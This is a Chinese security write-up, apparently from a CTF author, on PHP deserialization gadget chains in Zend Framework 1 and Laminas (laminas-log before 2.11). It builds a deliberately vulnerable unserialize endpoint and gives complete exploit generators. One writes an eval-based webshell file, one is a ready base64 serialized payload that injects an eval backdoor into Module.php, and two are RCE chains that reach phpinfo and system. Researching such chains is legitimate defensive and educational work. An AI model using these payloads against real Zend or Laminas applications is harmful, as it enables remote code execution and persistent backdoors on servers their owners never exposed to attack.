> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8975)

在`2020-11-23`号，在`twitter`上看到有师傅发了,`Zend Framework`框架的一条[反序列化链](https://twitter.com/ptswarm/status/1330878577936625671)。之后也分析了下，找到了几条链子，之后跟了跟其他版本的，都是存在反序列化漏洞的。然后就出了两个题目，一个 最新版的 laminas 和一个 ZendFramework 1 的链子。来写下文章抛砖引玉吧，应该还是有很多的链子的。

1.1 获取源码 & 创建 zf1 项目
--------------------

[原 pop 链地址](https://gist.github.com/YDyachenko/6f60709ce0fc346d0cc0252e07c6aa38)

其实一开始照这个框架就找了我一阵，因为`zend framework`已经到了`zf4` (laminas) 了，而这个反序列化链子是`zf1`，所以我们需要先从`https://github.com/zendframework/zf1`中下载到源码，然后使用

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114058-7f4170d0-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114058-7f4170d0-48be-1.png)

然后进入`bin`目录使用如下命令，来创建一个项目目录`web1`。接着我们把`libary`中的`Zend`目录移动到项目目录`web1/libary`中

```
zf create project web1
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114138-9733dd86-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114138-9733dd86-48be-1.png)

这样我们就得到了一个`zf1`框架。接着我们修改一下`application\controllers\IndexController.php`

```
<?php

class IndexController extends Zend_Controller_Action
{

    public function init()
    {
        /* Initialize action controller here */
    }

    public function indexAction()
    {
        // action body
        unserialize(base64_decode($_POST['Mrkaixin']));
        return "Mrkaixin";
    }
}


```

1.2 图说 POP 链
------------

先抛出整个利用栈吧。

```
Callback.php:150, Zend_Filter_Callback->filter()
Inflector.php:473, Zend_Filter_Inflector->filter()
Layout.php:780, Zend_Layout->render()
Mail.php:371, Zend_Log_Writer_Mail->shutdown()
Log.php:366, Zend_Log->__destruct()
IndexController.php:14, IndexController->indexAction()
...
Application.php:384, Zend_Application->run()
index.php:26, {main}()

```

整个 pop 链切入点在`library\Zend\Log.php`中的`__destruct`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114157-a2832516-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114157-a2832516-48be-1.png)

这里遍历了`$this->_writers`，并且触发了其中对象的`shutdown()`方法。这里我们使用的是`Zend_Log_Writer_Mail`这个类的`shutdown()`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114244-beed1d4c-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114244-beed1d4c-48be-1.png)

接着跟进这个`filter`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114313-d03765e4-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114313-d03765e4-48be-1.png)

这里其实可以看到这个链子的亮点就是，两个`filter`函数的调用。以及最后的`create_function`的命令注入。给人的感觉就是这个链子非常连贯。赞

1.3. 挖掘潜藏的反序列化链
---------------

这里其实还有很多的链子，这里丢一条挺简单的链子。

### 1.3.1 写 Shell

先放上调用栈

```
File.php:464, Zend_CodeGenerator_Php_File->write()
Yaml.php:104, Zend_Config_Writer_Yaml->render()
Mail.php:371, Zend_Log_Writer_Mail->shutdown()
Log.php:366, Zend_Log->__destruct()
IndexController.php:14, IndexController->indexAction()
...
Application.php:384, Zend_Application->run()
index.php:26, {main}()

```

我们使用`public function render\(\)`这个正则来搜索一下，有没有可以利用的`render()`函数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114335-dd30efae-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114335-dd30efae-48be-1.png)

最后锁定了`library\Zend\Config\Writer\Yaml.php`

```
public function render()
{
    // 这里可以自己跟一下，很简单就可以绕过的。 
    // $data 可以是任意的。
    $data        = $this->_config->toArray(); 
    $sectionName = $this->_config->getSectionName();
    $extends     = $this->_config->getExtends();

    if (is_string($sectionName)) {
        $data = array($sectionName => $data);
    }

    foreach ($extends as $section => $parentSection) {
        $data[$section][Zend_Config_Yaml::EXTENDS_NAME] = $parentSection;
    }

    // Ensure that each "extends" section actually exists
    foreach ($data as $section => $sectionData) {
        if (is_array($sectionData) && isset($sectionData[Zend_Config_Yaml::EXTENDS_NAME])) {
            $sectionExtends = $sectionData[Zend_Config_Yaml::EXTENDS_NAME];
            if (!isset($data[$sectionExtends])) {
                // Remove "extends" declaration if section does not exist
                unset($data[$section][Zend_Config_Yaml::EXTENDS_NAME]);
            }
        }
    }
    return call_user_func($this->getYamlEncoder(), $data);
}


```

这里我们可以看到，最后的`call_user_func($this->getYamlEncoder(), $data);`。其实这里我利用的`可变函数`这个点，来扩大利用。看下面这个`demo`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114356-e9b7987c-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114356-e9b7987c-48be-1.png)

跟进一下`$this->getYamlEncoder()`函数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114422-f93917f8-48be-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114422-f93917f8-48be-1.png)

可以发现这个可控的，所以我们可以另其为一个数组，其中第一个函数是类，然后第二个参数是类中的方法名。那么我们就可以利用这个技巧，调用任何类中的任何方法。

所以这里我们找一下，有没有直接写 shell 的点。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114446-073093cc-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114446-073093cc-48bf-1.png)

这里通过搜索，我们找到了一个，没有参数的`write`方法，并且这个方法中的一些参数，都是我们完全可以控制的。我们接着跟进一下`$this->generate()`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114519-1ad988ac-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114519-1ad988ac-48bf-1.png)

这里我们可以看到，`body`是我们可以控制的，并且直接拼接到了`output`当中, 所以我们写入的内容也是可控的。所以答案也就呼之欲出了

```
<?php

class Zend_Mail
{

}
class Zend_Log
{
    protected $_writers;

    function __construct()
    {
        $this->_writers = [new Zend_Log_Writer_Mail()];
    }

}


class Zend_Log_Writer_Mail
{

    protected $_eventsToMail;
    protected $_mail;
    protected $_layoutEventsToMail;
    protected $_layout;

    function __construct()
    {
        $this->_mail = new Zend_Mail();
        $this->_eventsToMail = [1];
        $this->_layoutEventsToMail = "";
        $this->_layout = new Zend_Config_Writer_Yaml();
    }
}

class Zend_CodeGenerator_Php_File
{
    protected $_filename;
    protected $_body;

    function __construct()
    {
        $this->_filename = "a.php";
        $this->_body = '@eval(base64_decode($_POST["Mrkaixin"]));';
    }
}

class Zend_Config
{
    protected $_data;
    protected $_loadedSection;
    protected $_extends;

    function __construct()
    {
        $this->_loadedSection = "Mrkaixin";
        $this->_data = [];
        $this->_extends = "Mrkaixin";
    }
}

class Zend_Config_Writer_Yaml
{
    protected $events;
    protected $_config;
    protected $_yamlEncoder;

    function __construct()
    {
        $this->events = "Mrkaixin";
        $this->_config = new Zend_Config();
        $this->_yamlEncoder = [new Zend_CodeGenerator_Php_File(), 'write'];
    }
}

echo base64_encode(serialize(new Zend_Log()));


```

Laminas 其实可以理解成为是最新版的 Zend Framework。其实这个框架中也是有很多的链子，可以直接 RCE 甚至 getshell，这里简单说几种抛砖引玉吧。

受影响的组件
------

**laminas/laminas-log versions prior to 2.11**

描述
--

在最新版 `laminas/laminas-mvc-skeleton` (1.2.x-dev 12ff936) version 之前, 如果用户安装了 `laminas/laminas-log`。在二次开发的过程中，如果出现了可控的反序列化点，那么就可以直接利用反序列化攻击，来 getshell 以及 rce。

Vulnerability verification
--------------------------

*   使用 `composer create-project -sdev laminas/laminas-mvc-skeleton my-application` 来下载源码
    
*   并且安装`laminas/laminas-log`
    

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210101140100-b918cc3c-4bf6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210101140100-b918cc3c-4bf6-1.png)

```
Would you like to install logging support? y/N
    y

      Would you like to install MVC-based console support? (We recommend migrating to zf-console, symfony/console, or Aura.CLI) y/N
      Will install laminas/laminas-log (^2.11)
      When prompted to install as a module, select application.config.php or modules.config.php
    y

```

2.1 设置反序列化入口
------------

搭好环境之后，我们在`module\Application\src\Controller\IndexController.php`设置一个反序列化的点。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114610-39672734-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114610-39672734-48bf-1.png)

然后碰到的最多的一个问题就是，怎么访问到这个 Action。这里翻阅一下开发文档就知道，这个框架的路由都是写在`module\Application\config\module.config.php`中的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114633-47199c2c-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114633-47199c2c-48bf-1.png)

其中就自带了如何访问这个`Action`。但是我们如果直接访问`http://your-ip/public/application[/:action]`会发现 404。

其实稍微熟悉 mvc 框架的同学一定知道，大多数的 mvc 框架都有一个入口文件, 而这里的入口文件就是`index.php`。所以我们要通过这个路由文件去访问路由才能正常访问到。所以我们访问一下`http://your-ip/public/index.php/application[/:action]`就可以顺利访问到这个`Action`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114649-50df2e84-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114649-50df2e84-48bf-1.png)

至此，我们就找到了我们的反序列化的点。

2.2 图说 POP 链。
-------------

这里其实可以找到很多链子，有很多师傅也找到了一些 rce 的链子，那么如何 GETSHELL 呢?

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114710-5d4c9cce-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114710-5d4c9cce-48bf-1.png)

可变参数我们屡见不鲜了，已经在很多场 CTF 中出现了，这里就不在赘述了.

这里我们已经可以执行任意类的任意方法了。所以根据题目描述，最终的反序列化的重点是 getshell，所以我们需要找一条可以直通`file_put_contents`的路。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114750-74f781fe-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114750-74f781fe-48bf-1.png)

所以整个的答案就呼之欲出了，下面给出调用栈。

```
AbstractInjector.php:379, Laminas\ComponentInstaller\Injector\ApplicationConfigInjector->remove()
PhpRenderer.php:396, call_user_func_array:{H:\phpstudy_pro\WWW\cms\laminas\my-application\vendor\laminas\laminas-view\src\Renderer\PhpRenderer.php:396}()
PhpRenderer.php:396, Laminas\View\Renderer\PhpRenderer->__call()
Mail.php:191, Laminas\View\Renderer\PhpRenderer->setBody()
Mail.php:191, Laminas\Log\Writer\Mail->shutdown()
PhpRenderer.php:396, call_user_func_array:{H:\phpstudy_pro\WWW\cms\laminas\my-application\vendor\laminas\laminas-view\src\Renderer\PhpRenderer.php:396}()
PhpRenderer.php:396, Laminas\View\Renderer\PhpRenderer->__call()
Logger.php:220, Laminas\View\Renderer\PhpRenderer->shutdown()
Logger.php:220, Laminas\Log\Logger->__destruct()
IndexController.php:25, Application\Controller\IndexController->evilAction()
AbstractActionController.php:77, Application\Controller\IndexController->onDispatch()
EventManager.php:331, Laminas\EventManager\EventManager->triggerListeners()
EventManager.php:188, Laminas\EventManager\EventManager->triggerEventUntil()
AbstractController.php:105, Application\Controller\IndexController->dispatch()
DispatchListener.php:139, Laminas\Mvc\DispatchListener->onDispatch()
EventManager.php:331, Laminas\EventManager\EventManager->triggerListeners()
EventManager.php:188, Laminas\EventManager\EventManager->triggerEventUntil()
Application.php:331, Laminas\Mvc\Application->run()
index.php:42, {main}()


```

exp 如下：（代码有点冗余，所以这里就不给文本了）师傅们自己复现一下吧

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114807-7f669314-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114807-7f669314-48bf-1.png)

运行得到：

```
TzoxNToiWmVuZFxMb2dcTG9nZ2VyIjoxOntzOjEwOiIAKgB3cml0ZXJzIjthOjE6e2k6MDtPOjMwOiJaZW5kXFZpZXdcUmVuZGVyZXJcUGhwUmVuZGVyZXIiOjE6e3M6OToiX19oZWxwZXJzIjtPOjE4OiJaZW5kXENvbmZpZ1xDb25maWciOjE6e3M6NzoiACoAZGF0YSI7YToxOntzOjg6InNodXRkb3duIjthOjI6e2k6MDtPOjIwOiJaZW5kXExvZ1xXcml0ZXJcTWFpbCI6Mzp7czo3OiIAKgBtYWlsIjtPOjMwOiJaZW5kXFZpZXdcUmVuZGVyZXJcUGhwUmVuZGVyZXIiOjE6e3M6OToiX19oZWxwZXJzIjtPOjE4OiJaZW5kXENvbmZpZ1xDb25maWciOjE6e3M6NzoiACoAZGF0YSI7YToxOntzOjc6InNldEJvZHkiO2E6Mjp7aTowO086NTg6IlplbmRcQ29tcG9uZW50SW5zdGFsbGVyXEluamVjdG9yXEFwcGxpY2F0aW9uQ29uZmlnSW5qZWN0b3IiOjQ6e3M6MTg6IgAqAGNsZWFuVXBQYXR0ZXJucyI7YToyOntzOjc6InBhdHRlcm4iO3M6MjoiLy8iO3M6MTE6InJlcGxhY2VtZW50IjtzOjA6IiI7fXM6MjI6IgAqAGlzUmVnaXN0ZXJlZFBhdHRlcm4iO3M6NDoiLy4rLyI7czoxODoiACoAcmVtb3ZhbFBhdHRlcm5zIjthOjI6e3M6NzoicGF0dGVybiI7czo4OiIvPFw/cGhwLyI7czoxMToicmVwbGFjZW1lbnQiO3M6MzQ6ImE9Ijw/cGhwIEBldmFsKCRfUE9TVFsiaGVsbG8iXSk7Pz4iO31zOjEwOiJjb25maWdGaWxlIjtzOjMzOiJtb2R1bGUvQXBwbGljYXRpb24vc3JjL01vZHVsZS5waHAiO31pOjE7czo2OiJyZW1vdmUiO319fX1zOjIxOiIAKgBzdWJqZWN0UHJlcGVuZFRleHQiO047czoxMjoiZXZlbnRzVG9NYWlsIjthOjI6e2k6MDtzOjE6Ii8iO2k6MTtzOjE6Ii8iO319aToxO3M6ODoic2h1dGRvd24iO319fX19fQ==

```

2.4 条条大路通罗马
-----------

### 2.4.1 GETSHELL

另一条写 shell 的链子

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201228114846-9646f5c4-48bf-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201228114846-9646f5c4-48bf-1.png)

以及一些师傅的 RCE 的链子

### 2.4.2 RCE 1

```
<?php

namespace Zend\View\Renderer;
use Zend\Config\Config;

class PhpRenderer
{
    function __construct()
    {
        $this->__helpers = new Config();
    }

}
namespace Zend\Config;

class Config {
    protected $data = [];

    function __construct()
    {
        $this->data = ['shutdown'=>"phpinfo"];
    }
}

namespace Zend\Log;

use Zend\View\Renderer\PhpRenderer;

class Logger
{
    protected $writers;

    function __construct()
    {
        $this->writers = [new PhpRenderer()];
    }

}
echo base64_encode(serialize(new Logger()));


```

### 2.4.3 RCE2

```
<?php

namespace Laminas\View\Resolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace Laminas\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
        }
    }
}


namespace Laminas\Log\Writer{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
        protected $eventsToMail = ["ls"];  
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new \Laminas\View\Renderer\PhpRenderer();
        }
    }
}

namespace Laminas\Log{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new \Laminas\Log\Writer\Mail()];
        }
    }
}


namespace{
$a = new \Laminas\Log\Logger();
echo base64_encode(serialize($a));
}


```